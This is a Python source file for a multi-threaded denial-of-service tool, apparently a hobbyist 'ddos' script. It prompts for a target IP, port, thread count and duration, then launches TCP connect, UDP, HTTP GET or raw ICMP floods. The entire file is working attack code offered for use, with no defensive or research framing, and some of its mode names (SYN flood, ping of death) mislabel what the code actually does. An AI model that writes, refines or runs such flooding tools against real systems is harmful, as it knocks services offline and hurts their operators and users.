import socket
import random
import threading
import time
import sys
import os
from pystyle import Colors, Colorate, Center

class BlackoutX:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.is_attacking = False

    def syn_flood(self):
        while self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_ip, self.target_port))
                s.sendto(("GET / HTTP/1.1\r\n").encode(), (self.target_ip, self.target_port))
                s.close()
            except:
                pass

    def udp_flood(self):
        while self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                fake_data = random._urandom(1024)
                s.sendto(fake_data, (self.target_ip, self.target_port))
                s.close()
            except:
                pass

    def http_flood(self):
        while self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_ip, self.target_port))
                s.send(("GET /?{} HTTP/1.1\r\nHost: {}\r\n\r\n".format(random.randint(0, 2000), self.target_ip)).encode())
                s.close()
            except:
                pass

    def icmp_ping_death(self):
        while self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.sendto(b'\x08\x00\x00\x00' * 1000, (self.target_ip, 0))
                s.close()
            except:
                pass

    def start_attack(self, attack_type, threads=500, attack_time=30):
        self.is_attacking = True
        print(Colorate.Horizontal(Colors.purple_to_blue,
              f"\n[!] BLACKOUT-X ACTIVATED! TARGET: {self.target_ip}:{self.target_port}"))
        print(Colorate.Horizontal(Colors.purple_to_blue,
              f"[!] MODE: {attack_type.upper()} | THREADS: {threads} | DURATION: {attack_time}s"))

        for _ in range(threads):
            if attack_type == "syn":
                threading.Thread(target=self.syn_flood).start()
            elif attack_type == "udp":
                threading.Thread(target=self.udp_flood).start()
            elif attack_type == "http":
                threading.Thread(target=self.http_flood).start()
            elif attack_type == "icmp":
                threading.Thread(target=self.icmp_ping_death).start()

        time.sleep(attack_time)
        self.stop_attack()

    def stop_attack(self):
        self.is_attacking = False
        print(Colorate.Horizontal(Colors.purple_to_blue, "\n[!] ATTACK STOPPED! TARGET SHOULD BE DOWN!\n"))

def print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = r"""
████████▄  ████████▄   ▄██████▄     ▄████████ 
███   ▀███ ███   ▀███ ███    ███   ███    ███ 
███    ███ ███    ███ ███    ███   ███    █▀  
███    ███ ███    ███ ███    ███   ███        
███    ███ ███    ███ ███    ███ ▀███████████ 
███    ███ ███    ███ ███    ███          ███ 
███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
████████▀  ████████▀   ▀██████▀   ▄████████▀  
                                                 
"""
    subtitle = "kawaii ddos by vantixt"
    print(Colorate.Horizontal(Colors.purple_to_blue, Center.XCenter(banner)))
    print(Colorate.Horizontal(Colors.purple_to_blue, Center.XCenter(subtitle)))

def main():
    print_banner()

    # Input
    target_ip = input(Colorate.Horizontal(Colors.purple_to_blue, "[?] TARGET IP: "))
    target_port = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[?] TARGET PORT: ")))

    # Mode selection
    menu = """
[1] ➤ SYN-Flood (TCP Connection Overload)
[2] ➤ UDP-Flood (Bandwidth Killer)
[3] ➤ HTTP-Flood (Webserver Crasher)
[4] ➤ ICMP-Ping-Death (Router Destroyer)
"""
    print(Colorate.Horizontal(Colors.purple_to_blue, menu))
    choice = input(Colorate.Horizontal(Colors.purple_to_blue, "[?] SELECT ATTACK MODE (1-4): "))

    attack_types = {
        "1": "syn",
        "2": "udp",
        "3": "http",
        "4": "icmp"
    }

    if choice not in attack_types:
        print(Colorate.Horizontal(Colors.purple_to_blue, "\n[!] INVALID SELECTION!"))
        sys.exit(1)

    threads = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[?] THREADS (Default: 500): ")))
    attack_time = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[?] ATTACK DURATION (Seconds): ")))

    # Launch
    attacker = BlackoutX(target_ip, target_port)
    attacker.start_attack(attack_types[choice], threads, attack_time)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.purple_to_blue, "\n[!] ABORTED BY USER!"))
        sys.exit(0)
